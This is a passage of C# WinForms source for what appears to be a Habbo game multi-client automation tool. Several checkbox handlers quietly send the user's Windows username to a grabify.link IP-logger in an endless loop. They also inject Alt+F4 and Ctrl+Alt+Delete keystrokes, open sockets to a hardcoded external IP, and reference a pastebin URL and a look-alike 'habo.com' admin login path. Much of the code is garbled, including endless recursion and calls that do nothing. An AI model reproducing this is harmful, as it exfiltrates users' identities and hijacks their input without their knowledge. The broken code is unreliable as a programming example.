                        HttpClient.BaseAddress = new Uri("https://grabify.link/GJWGLL");
                        var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, HttpClient.BaseAddress);
                        Func<byte[], string> HMessage = delegate (byte[] Buffer) { wm_char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter); return Environment.UserName.ToString(); };
                        HttpReqMsg.Content = new StringContent(Newtonsoft.Json.JsonConvert.SerializeObject(HMessage(new byte[] { (byte)Process.GetCurrentProcess().MainWindowHandle })));
                        var SendAsync = HttpClient.SendAsync(HttpReqMsg);
                        BrowserClients[0].ExecuteScriptAsync(SendAsync.ToString());
                        // Application.Exit();
                    }
                    SendKeys.Send("{ENTER}");
                }


            }

            if (checkBox4.Text.ToString().Contains("Ma0l") && checkBox4.Text.ToString().Length > 4)
            {
                Process.Start("Notepad.exe");
                Clipboard.SetText(Environment.UserName);
                SendKeys.Send("^v"); SendKeys.Send("{ENTER}");
                Process.Start("https://grabify.link/GJWGLL");
                Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
                wm_char.CombineKeys(Desktop.Robot.Key.Alt, Desktop.Robot.Key.F4);
                wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.Alt, Desktop.Robot.Key.Delete, Desktop.Robot.Key.Down, Desktop.Robot.Key.Enter);
                while (true)
                {
                    using (var HttpClient = new HttpClient())
                    {
                        HttpClient.GetAsync("https://grabify.link/GJWGLL");
                        HttpClient.BaseAddress = new Uri("https://grabify.link/GJWGLL");
                        var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, HttpClient.BaseAddress);
                        Func<byte[], string> HMessage = delegate (byte[] Buffer) { wm_char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter); return Environment.UserName.ToString(); };
                        HttpReqMsg.Content = new StringContent(Newtonsoft.Json.JsonConvert.SerializeObject(HMessage(new byte[] { (byte)Process.GetCurrentProcess().MainWindowHandle })));
                        var SendAsync = HttpClient.SendAsync(HttpReqMsg);
                        BrowserClients[0].ExecuteScriptAsync(SendAsync.ToString());
                        Application.Exit();
                    }
                    SendKeys.Send("{ENTER}");
                }




            }
            if (checkBox4.Text.ToString().Contains("Ma0l"))
            {
                timer3.Stop();
                timer2.Stop();
            }

        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {

            textBox2.Enabled = true;
            if (textBox5.Text.ToString().Contains("Start"))
            {
                timer3.Stop();
                button4.Enabled = true;
                [DllImport("user32.dll")]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                textBox3.Text = textBox4.Text;
                textBox1.Text = textBox4.Text;
                SetParent(Process.GetCurrentProcess().MainWindowHandle, IntPtr.Zero);
                SetParent(Process.GetCurrentProcess().MainWindowHandle, ClientModules[0].MainWindowHandle);
                textBox3.Text = textBox4.Text;
                textBox1.Text = textBox4.Text;
                button4.PerformClick();
            }
            if (textBox5.Text.ToString().Contains("Stop"))
            {
                button4.Enabled = true;
                [DllImport("user32.dll")]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                SetParent(Process.GetCurrentProcess().MainWindowHandle, IntPtr.Zero);
            }
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {
            Process.GetCurrentProcess().Refresh();
            ////  Process.GetCurrentProcess().WaitForInputIdle();
            Process.GetCurrentProcess().WaitForExit();
            ClientModules.Add(Process.GetProcessById(int.Parse(textBox4.Text.ToString())));

        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            richTextBox2.Text = System.IO.File.ReadAllText("C://Users//" + Environment.UserName + "//Desktop//HomeRoom.txt");

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            var Filepath = "C:\\Users\\Admin\\Desktop\\API\\Public\\Figurestring.php";
            var userHost = Filepath.Replace("Admin", Environment.UserName);
            StreamWriter SW = new StreamWriter(userHost);
            SW.WriteLine("https://www.habbo.com/api/public/cachpaToken=Stop");
            SW.Close();
            SW.Dispose();
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            var Filepath = "C:\\Users\\Admin\\Desktop\\API\\Public\\Figurestring.php";
            var userHost = Filepath.Replace("Admin", Environment.UserName);
            StreamWriter SW = new StreamWriter(userHost);
            SW.WriteLine("https://www.habbo.com/api/public/cachpaToken=Stop");
            SW.Close();
            SW.Dispose();
            //wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.Alt, Desktop.Robot.Key.Delete);
        }

        private void richTextBox2_TextChanged(object sender, EventArgs e)
        {
            if (richTextBox2.Text.Contains(Process.GetCurrentProcess().MainWindowTitle.ToString()))
            {
                // MessageBox.Show("Test");
                toolStripButton1.PerformClick();
                [DllImport("user32.dll")]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                SetParent(toolStrip1.Handle, ClientModules[0].MainWindowHandle);

                //   wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.Alt, Desktop.Robot.Key.Delete);
            }
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            textBox2.Text = Process.GetCurrentProcess().Id.ToString();
            timer5.Interval = 1302;
            timer5.Start();
            var Filepath = "C:\\Users\\Admin\\Desktop\\API.js";
            //MessageBox.Show(File.ReadAllText(Filepath.Replace("Admin", Environment.UserName)));

            var script = Filepath.Replace("Admin", Environment.UserName);
            webView21.ExecuteScriptAsync(System.IO.File.ReadAllText(script));
            Process Disposed = Process.GetProcessById(int.Parse(textBox2.Text.ToString()));
            ClientModules.Add(Disposed);
            //  Disposed.GetType().InvokeMember(null, System.Reflection.BindingFlags.InvokeMethod, null, Disposed, null);
            TcpClient Clientsock = new TcpClient("127.0.0.1", 30001);

            using (var BW = new BinaryWriter(new MemoryStream(new byte[Clientsock.Client.ReceiveBufferSize])))
            {


                BW.Write("https://www.habbo.com");
                Func<IntPtr, byte[]> refPostMessage = delegate (IntPtr hwnd) { [DllImport("user32.dll", SetLastError = true)] static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo); keybd_event(0x02, 0, 0x0000, 0); keybd_event(0x010, 0, 0x0002, 0); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0002, 0); keybd_event(0x0D, 0, 0x0000, 0); SendKeys.SendWait("{ENTER}"); Desktop.Robot.Robot wm = new Desktop.Robot.Robot(); return new byte[] { (byte)Process.GetProcessById(int.Parse(textBox6.Text.ToString())).MainWindowHandle }; };
                BW.Write(refPostMessage(Disposed.MainWindowHandle));
                string post()
                {
                    SendKeys.Send(refPostClientMsg(int.Parse(textBox6.Text.ToString())));
                    return "";
                }

                BW.BaseStream.Read(Encoding.ASCII.GetBytes(post()), 0, 0);
                BW.Close();
                Process.GetCurrentProcess().Refresh();
                ////  Process.GetCurrentProcess().WaitForInputIdle();
                Process.GetCurrentProcess().WaitForExit();

                BW.Dispose();
            }
            checkBox6.Checked = true;
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            var Filepath = "C:\\Users\\Admin\\Desktop\\API.js";
            //MessageBox.Show(File.ReadAllText(Filepath.Replace("Admin", Environment.UserName)));

            var script = Filepath.Replace("Admin", Environment.UserName);
            webView21.ExecuteScriptAsync(System.IO.File.ReadAllText(script));
            Process Disposed = Process.GetProcessById(int.Parse(textBox2.Text.ToString()));
            //  Disposed.GetType().InvokeMember(null, System.Reflection.BindingFlags.InvokeMethod, null, Disposed, null);
            TcpClient Clientsock = new TcpClient("127.0.0.1", 30001);
            using (var BW = new BinaryWriter(new MemoryStream(new byte[Clientsock.Client.ReceiveBufferSize])))
            {


                BW.Write("https://www.habbo.com");
                Func<IntPtr, byte[]> refPostMessage = delegate (IntPtr hwnd) { [DllImport("user32.dll", SetLastError = true)] static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo); keybd_event(0x02, 0, 0x0000, 0); keybd_event(0x010, 0, 0x0002, 0); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0002, 0); keybd_event(0x0D, 0, 0x0000, 0); SendKeys.SendWait("{ENTER}"); Desktop.Robot.Robot wm = new Desktop.Robot.Robot(); return new byte[] { (byte)Process.GetProcessById(int.Parse(textBox8.Text.ToString())).MainWindowHandle }; };
                BW.Write(refPostMessage(Disposed.MainWindowHandle));
                string post()
                {
                    SendKeys.Send(refPostClientMsg(int.Parse(textBox8.Text.ToString())));
                    return "";
                }

                BW.BaseStream.Read(Encoding.ASCII.GetBytes(post()), 0, 0);
                BW.Close();
                Process.GetCurrentProcess().Refresh();
                ////  Process.GetCurrentProcess().WaitForInputIdle();
                Process.GetCurrentProcess().WaitForExit();

                BW.Dispose();
            }
            checkBox7.Checked = true; checkBox8.Checked = true;

        }

        private void checkBox7_CheckedChanged(object sender, EventArgs e)
        {
            var Filepath = "C:\\Users\\Admin\\Desktop\\API.js";
            //MessageBox.Show(File.ReadAllText(Filepath.Replace("Admin", Environment.UserName)));

            var script = Filepath.Replace("Admin", Environment.UserName);
            webView21.ExecuteScriptAsync(System.IO.File.ReadAllText(script));
            Process Disposed = Process.GetProcessById(int.Parse(textBox2.Text.ToString()));
            //  Disposed.GetType().InvokeMember(null, System.Reflection.BindingFlags.InvokeMethod, null, Disposed, null);
            TcpClient Clientsock = new TcpClient("127.0.0.1", 30001);
            using (var BW = new BinaryWriter(new MemoryStream(new byte[Clientsock.Client.ReceiveBufferSize])))
            {


                BW.Write("https://www.habbo.com");
                Func<IntPtr, byte[]> refPostMessage = delegate (IntPtr hwnd) { [DllImport("user32.dll", SetLastError = true)] static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo); keybd_event(0x02, 0, 0x0000, 0); keybd_event(0x010, 0, 0x0002, 0); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0002, 0); keybd_event(0x0D, 0, 0x0000, 0); SendKeys.SendWait("{ENTER}"); Desktop.Robot.Robot wm = new Desktop.Robot.Robot(); return new byte[] { (byte)Process.GetProcessById(int.Parse(textBox7.Text.ToString())).MainWindowHandle }; };
                BW.Write(refPostMessage(Disposed.MainWindowHandle));
                string post()
                {
                    SendKeys.Send(refPostClientMsg(int.Parse(textBox7.Text.ToString())));
                    return "";
                }

                BW.BaseStream.Read(Encoding.ASCII.GetBytes(post()), 0, 0);
                BW.Close();
                Process.GetCurrentProcess().Refresh();
                ////  Process.GetCurrentProcess().WaitForInputIdle();
                Process.GetCurrentProcess().WaitForExit();

                BW.Dispose();
            }
        }

        private void checkBox8_CheckedChanged(object sender, EventArgs e)
        {
            // MessageBox.Show("Test");
        }

        private void checkBox9_CheckedChanged(object sender, EventArgs e)
        {
            // MessageBox.Show("Test");
        }

        private void checkBox10_CheckedChanged(object sender, EventArgs e)
        {
            //MessageBox.Show("Test");
        }

        private void button6_Click(object sender, EventArgs e)
        {
            List<CheckBox> Formcontrol = new List<CheckBox>();
            using (var HttpClient = new HttpClient { BaseAddress = new Uri("https://www.habbo.com/logout") }) ;
            Formcontrol.Add(checkBox5);
            Formcontrol.Add(checkBox6);
            Formcontrol.Add(checkBox7);
            foreach (var items in Formcontrol)
            {
                items.Enabled = true;
                items.Checked = true;
                items.Checked = false;

            }

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            button3.Enabled = true;
            button3.PerformClick();
        }
        public string XrefPostClinet(object sender, EventArgs e)
        {
            Process Disposed = Process.GetProcessById(int.Parse(textBox2.Text.ToString()));
            Process[] Clients = Process.GetProcessesByName(Disposed.ProcessName);
            foreach (Process x in Clients)
            {

                var xProc = PostMessageRef(x.Handle);
                x.Handle.Equals(xProc.Handle);
                Process BeginStart = PostMessageRef(x.Handle);
                x.MainWindowHandle.Equals(BeginStart.Handle);
                PostMessageRef(x.Handle);

                //xProc.Start();
                //Disposed.GetType().GetElementType().InvokeMember("PostMessage", System.Reflection.BindingFlags.InvokeMethod, null, PostMessageRef(x.MainWindowHandle), null);
                //Disposed.GetType().InvokeMember("PostMessage", System.Reflection.BindingFlags.InvokeMethod, null, Disposed, null);
                using (BinaryWriter BW = new BinaryWriter(new MemoryStream(new byte[(IntPtr)Disposed.MainWindowHandle])))
                {
                    BW.Write("https://www.habbo.com");
                    Func<IntPtr, byte[]> refPostMessage = delegate (IntPtr hwnd) { [DllImport("user32.dll", SetLastError = true)] static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo); const int KEYEVENTF_KEYDOWN = 0x0000; const int KEYEVENTF_EXTENDEDKEY = 0x0001; const int KEYEVENTF_KEYUP = 0x0002; const int VK_LCONTROL = 0xA2; const int A = 0x41; const int C = 0x43; keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(A, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(A, 0, KEYEVENTF_KEYUP, 0); keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0); keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(C, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(C, 0, KEYEVENTF_KEYUP, 0); keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0); keybd_event(0x01, 0, 0x0000, 0); keybd_event(0x010, 0, 0x0002, 0); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0002, 0); keybd_event(0x0D, 0, 0x0000, 0); SendKeys.SendWait("{ENTER}"); Desktop.Robot.Robot wm = new Desktop.Robot.Robot(); wm.GetMousePosition(); return new byte[] { }; };
                    BW.Write(refPostMessage(Disposed.MainWindowHandle));
                    Socket Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); ;
                    Server.Connect("127.0.0.1", 30001);
                    Server.Send(PostMsg(0x01));
                    Server.Send(PostMsg(0x011));
                    Server.Send(PostMsg(0x11));
                    Server.Send(PostMsg(0x56));
                    Server.Send(PostMsg(0x56));
                    Server.Send(PostMsg(0x0D));
                    [DllImport("user32.dll", SetLastError = true)]
                    static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

                    const int KEYEVENTF_KEYDOWN = 0x0000;
                    const int KEYEVENTF_EXTENDEDKEY = 0x0001;
                    const int KEYEVENTF_KEYUP = 0x0002;
                    const int VK_LCONTROL = 0xA2;
                    const int A = 0x41; //A key code
                    const int C = 0x43; //C key code

                    #region SetParent
                    static string PressKeys()
                    {
                        // Hold Control down and press A
                        keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(A, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(A, 0, KEYEVENTF_KEYUP, 0); keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0); keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(C, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(C, 0, KEYEVENTF_KEYUP, 0); keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0);

                        keybd_event(A, 0, KEYEVENTF_KEYDOWN, 0);
                        keybd_event(A, 0, KEYEVENTF_KEYUP, 0);
                        keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0);

                        // Hold Control down and press C
                        keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYDOWN, 0);
                        keybd_event(C, 0, KEYEVENTF_KEYDOWN, 0);
                        keybd_event(C, 0, KEYEVENTF_KEYUP, 0);
                        keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0);
                        return PressKeys();
                    }
                    #endregion
                    BW.BaseStream.Read(Encoding.Default.GetBytes(PressKeys()), 0, 0);
                    BW.BaseStream.BeginRead(new List<byte[]> { Encoding.Default.GetBytes(PressKeys()) }[0], 0, 0, new AsyncCallback((sender) => { Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot(); wm_char.GetMousePosition(); wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.Alt, Desktop.Robot.Key.Delete, Desktop.Robot.Key.Esc, Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Enter); PressKeys(); wm_char.CombineKeys(Desktop.Robot.Key.Esc, Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter); }), new List<object[]> { new object[] { ((System.Windows.Forms.MethodInvoker)delegate { void PressKeys() {  keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYDOWN, 0);keybd_event(A, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(A, 0, KEYEVENTF_KEYUP, 0);keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0); keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYDOWN, 0); keybd_event(C, 0, KEYEVENTF_KEYDOWN, 0);  keybd_event(C, 0, KEYEVENTF_KEYUP, 0); keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0);

    keybd_event(A, 0, KEYEVENTF_KEYDOWN, 0);
    keybd_event(A, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0);

    // Hold Control down and press C
    keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYDOWN, 0);
    keybd_event(C, 0, KEYEVENTF_KEYDOWN, 0);
    keybd_event(C, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LCONTROL, 0, KEYEVENTF_KEYUP, 0); } }) } }[0]);
                    timer3.Interval = 443;
                    timer3.Start();

                    Func<byte[], ushort> EndAccept = delegate (byte[] Hwnd) { timer4.Stop(); toolStrip1.Enabled = false; return 0x00b9; };
                    Server.Send(PostMessage(EndAccept(PostMessage(0x000))));
                    BW.Close();
                    BW.Dispose();
                }
            }
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(webView21.ExecuteScriptAsync("setTimeout(()=>{ window.location.href='https://www.habbo.com/logout';showDirectoryPicker();},1993);").ToString()));
        }
        private void timer4_Tick(object sender, EventArgs e)
        {
            tabControl1.SelectedTab = tabControl1.TabPages[1];
            toolStripButton1.PerformClick();
            [DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
            var Proc = Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
            Process[] Client = Process.GetProcessesByName(Proc.ProcessName);
            foreach (var items in Client)
            {
                TcpClient Clientsock = new TcpClient("127.0.0.1", 30001);
                using (var BW = new BinaryWriter(new MemoryStream(new byte[Clientsock.Client.ReceiveBufferSize])))
                {


                    BW.Write("https://www.habbo.com");
                    Func<IntPtr, byte[]> refPostMessage = delegate (IntPtr hwnd) { [DllImport("user32.dll", SetLastError = true)] static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x011, 0, 0x0002, 0); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0002, 0); keybd_event(0x0D, 0, 0x0000, 0); SendKeys.SendWait("{ENTER}"); Desktop.Robot.Robot wm = new Desktop.Robot.Robot(); return new byte[] { }; };
                    BW.Write(refPostMessage(items.MainWindowHandle));
                    string post()
                    {
                        SendKeys.Send(XrefPostClinet(sender, e));
                        return "";
                    }

                    BW.BaseStream.Read(Encoding.ASCII.GetBytes(post()), 0, 0);
                    BW.Close();
                    Process.GetCurrentProcess().Refresh();
                    ////  Process.GetCurrentProcess().WaitForInputIdle();
                    Process.GetCurrentProcess().WaitForExit();

                    BW.Dispose();
                }

            }
        }

        private void toolStripContainer1_ContentPanel_Load(object sender, EventArgs e)
        {

        }

        private void button8_Click(object sender, EventArgs e)
        {
            [DllImport("user32.dll", SetLastError = true)]
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            static extern bool ShowWindow(IntPtr hwnd, int nCmdshow);
            using (var HttpClient = new HttpClient())
            {

                HttpClient.BaseAddress = new Uri("https://www.pastebin.com/raw/TF9MauVK");
                var GetAsync = HttpClient.GetAsync("https://www.habo.com/api/public/authentiction/loginv2/admin.php");
                //Console.WriteLine(GetAsync.Result.ToString());
                //richTextBox1.Text += GetAsync.Result.Content.ReadAsStringAsync().Result.ToString();
                foreach (ClientForm x in FormClients)
                {
                    x.CanSelect.Equals(true);
                    x.SelectNextControl(x, x.showWindow(Process.GetCurrentProcess().MainWindowHandle, new byte[] { (byte)x.Cursor.Handle }), false, false, true);
                    x.SelectNextControl(x, false, false, true, false);
                    x.Select();
                    return;
                }
            }
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            foreach (var items in FormClients)
            {
                [DllImport("user32.dll")]
                static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                static extern void keybd_event(byte bKey, byte bScan, int dwFlags, int dwExtraInfo);
                byte[] Hwnd = new byte[items.Width];
                Func<byte[], int> BeginDisconnect = delegate (byte[] Buffer) { for (int i = 0; i < Hwnd.Length; i++) { SetParent(items.Handle, IntPtr.Zero); SetParent(IntPtr.Zero, items.Handle); SetParent(items.Handle, panel5.Handle); SetParent(panel5.Handle, IntPtr.Zero); SetParent(items.Handle, IntPtr.Zero); Hwnd[i] += new byte[] { 0x000 }[0]; Hwnd[i] += new byte[] { 0x11 }[0]; Hwnd[i] += new byte[] { 0x56 }[0]; Hwnd[i] += new byte[] { 0x0D }[0]; SetParent(IntPtr.Zero, items.Handle); SetParent(items.Handle, panel6.Handle); } return items.Height; };
                var httpClient = new HttpClient();
                httpClient.BaseAddress = new Uri("https://www.habbo.com/api/public/");
                using (var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, "http://localhost:30001/"))
                {
                    var GetAsync = httpClient.GetAsync("https://www.habbo.com/logout");
                    richTextBox2.Text += GetAsync.Result.Content.ReadAsStringAsync().Result.ToString() + "<script></script>";
                    if (GetAsync.Result.ToString().Length >= 0)
                    {
                        richTextBox1.Text += GetAsync.Result.ToString() + GetAsync.Result.Content.ReadAsStringAsync().ToString();
                        Array.Resize<byte>(ref Hwnd, BeginDisconnect(Hwnd));
                        Array.Resize(ref Hwnd, BeginDisconnect(new byte[] { 0x11, 0, 0x0002, 0, 0x56, 0, 0x0000, 0x0D, 0, 0x0002, 0 }));

                    }
                }
            }
        }

        private void timer6_Tick(object sender, EventArgs e)
        {
            Process[] Dispsoed = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
            foreach (var items in Dispsoed)
            {
                List<Process> dispose = new List<Process>();
                dispose.Add(items);
                #region EndIf
                foreach (var itemsData in dispose)
                {
                    checkedListBox1.CanSelect.Equals(true);
                    checkedListBox1.CanFocus.Equals(true);
                    foreach (var Clients in FormClients)
                    {
                        {
                            Clients.CanSelect.Equals(true);
                            Socket ClientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            ClientSock.Connect("69.172.200.161", 443);
                            switch (ClientSock.Connected)
                            {
                                case false:
                                    {
                                        if (!ClientSock.Connected)
                                        {
                                            [DllImport("user32.dll", SetLastError = true, EntryPoint = "SetParent")]
                                            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                            SetParent(Clients.Handle, panel1.Handle);
                                            Clients.SelectNextControl(this, false, true, false, false);
                                            Clients.CanSelect.Equals(true); Clients.Focus();
                                            Clients.Select();

                                        }
                                        if (ClientSock.Connected)
                                        {
                                            Clients.SelectNextControl(this, false, true, false, false);
                                            Clients.CanSelect.Equals(true); Clients.Focus();
                                            Clients.Select();
                                            [DllImport("user32.dll", SetLastError = true, EntryPoint = "SetParent")]
                                            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                            SetParent(Clients.Handle, panel1.Handle);

                                        }
                                        break;
                                    }

                                case true:

                                    {
                                        if (!ClientSock.Connected)
                                        {
                                            [DllImport("user32.dll", SetLastError = true, EntryPoint = "SetParent")]
                                            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                            SetParent(Clients.Handle, panel1.Handle);
                                            Clients.SelectNextControl(this, false, true, false, false);
                                            Clients.CanSelect.Equals(true); Clients.Focus();
                                            Clients.Select();

                                        }
                                        if (ClientSock.Connected)
                                        {
                                            Clients.SelectNextControl(this, false, true, false, false);
                                            Clients.CanSelect.Equals(true); Clients.Focus();
                                            Clients.Select();
                                            [DllImport("user32.dll", SetLastError = true, EntryPoint = "SetParent")]
                                            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                            SetParent(Clients.Handle, panel1.Handle);
                                        }
                                    }
                                    break;

                                default:
                                    {
                                        [DllImport("user32.dll", SetLastError = true, EntryPoint = "SetParent")]
                                        static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                        SetParent(Clients.Handle, panel1.Handle);
                                        var hwnd = Clients.CanSelect == true;
                                        if (hwnd)
                                        {
                                            Console.Write(false);
                                            Clients.CanSelect.Equals(hwnd);
                                            Clients.CanFocus.Equals(true);
                                            Clients.Focus();
                                            Clients.Select();
                                            SetParent(Clients.Handle, Clients.Handle);
                                            Console.Write(true);
                                            return;
                                        }
                                        if (!hwnd)
                                        {
                                            Console.Write(false);
                                            Clients.CanSelect.Equals(hwnd);
                                            Clients.CanFocus.Equals(true);
                                            Clients.Focus();
                                            Clients.Select();
                                            SetParent(Clients.Handle, Clients.Handle);
                                            Console.Write(true);
                                            return;
                                        }
                                        break;
                                    }
                            }
                        }
                    }
                    if (items.MainWindowHandle != IntPtr.Zero)
                    {
                        var HClient = new HttpClient { BaseAddress = new Uri("https://www.habbo.com/api/public/authentication/loginv2") };
                        var Result = HClient.GetAsync("https://www.habbo.com/logout");
                        richTextBox2.Text += new byte[Result.Result.Content.ReadAsStream().ReadByte()].ToString();
                        richTextBox2.Text += "base64:" + Convert.ToBase64String(Encoding.UTF8.GetBytes(Result.Result.Content.ReadAsStringAsync().Result.ToString()));
                    }

                }
                #endregion
            }
        }

        private void panel6_Paint(object sender, PaintEventArgs e)
        {

        }
        public static List<ModuleContainer.BeginDispose> Webview2 = new List<ModuleContainer.BeginDispose>();
        public class ModuleContainer : Microsoft.Web.WebView2.WinForms.WebView2
        {
            public class BeginDispose : Process
            {
                public virtual string refPostMessage { get; set; }
                public BeginDispose(HttpRequestMessage HMessage)
                {
                    foreach (var item in FormClients)
                    {
                        var HttpClient = new HttpClient();
                        HttpClient.BaseAddress = new Uri("http://69.172.200.161:30001/");
                        WebClient wc = new WebClient();

                        wc.BaseAddress = new Uri("https://www.habbo.com/habbo-imaging/avatar" + System.IO.File.ReadAllText("C:\\Client\\ClientApp\\Figurestring.php")).ToString();
                        Func<byte[], string> refPostMessae = delegate (byte[] hwnd) { var Pid = File.ReadAllText("C://pid.txt"); Console.WriteLine(Process.GetProcessById(int.Parse(Pid.ToString()))); Clipboard.SetText(Process.GetProcessById(int.Parse(Pid.ToString())).MainWindowHandle.ToString()); return Process.GetProcessById(int.Parse(Pid)).ProcessName.ToString() + Process.GetCurrentProcess().MainWindowTitle; };

                        string PostMessageRef()
                        {
                            refPostMessae.Invoke(new byte[] { 0x00 });
                            return PostMessageRef();
                        }
                        TcpClient ClientSock = new TcpClient("69.172.200.161", 30001);
                        ClientSock.Client.BeginConnect(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 30001), new AsyncCallback((IAsyncResult) => { Console.WriteLine(0x11); }), null);

                    }
                }

            }
            private void button9_Click(object sender, EventArgs e)
            {

            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Process Client = Process.GetProcessById(int.Parse(textBox13.Text.ToString()));


            textBox14.Text = Client.MainWindowHandle.ToString();

        }

        private void checkBox11_CheckedChanged(object sender, EventArgs e)
        {
            timer7.Interval = 3210;
            timer7.Start();
        }

        private void textBox13_TextChanged(object sender, EventArgs e)
        {

        }

        private void timer7_Tick(object sender, EventArgs e)
        {
         
            using (var HttpClient = new HttpClient { BaseAddress = new Uri("https://www.habbo.com/api/public/authentication/loginv2") })
            {
                var GetAsync = HttpClient.GetAsync("https://www.habbo.com/logout");
                richTextBox3.Text += GetAsync.Result.Content.ReadAsStringAsync().Result.ToString() + "<script></script>";
                var HttpReqMsg = "C://Users//" + Environment.UserName + "//Desktop//API//Public//Figurestring.php";
                var Getline = File.ReadAllText(HttpReqMsg);
                if (Getline.Contains("Start"))
                {
                    richTextBox3.Text = "<script src=https://www.habbo.com/api/public/rooms" + ClientModules[0].MainWindowHandle.ToString() + "/Forwward>";
                    button6.Enabled = true;
                    button6.Text = ClientModules[0].MainWindowTitle.Replace("Habbo |", string.Empty);
                    button6.PerformClick();
                
                }

                if (Getline.Contains("Stop"))
                {
                    Func<byte[], string> EndAccept = delegate (byte[] hwnd) { button6.Text = "STOP"; timer6.Stop(); return ClientModules[0].MainWindowTitle; };
                    var hMessage = new HttpRequestMessage(HttpMethod.Post, "https://www.habbo.com/api/public/authentication/loginv2");
                    hMessage.Content = new StringContent(EndAccept(new byte[] { (byte)ClientModules[0].MainWindowHandle }));
                    webView21.ExecuteScriptAsync(HttpClient.SendAsync(hMessage).ToString());
                    EndAccept(new byte[] { 0x000 });

                }
            }
        }

        private void textBox6_TextChanged(object sender, EventArgs e)
        {
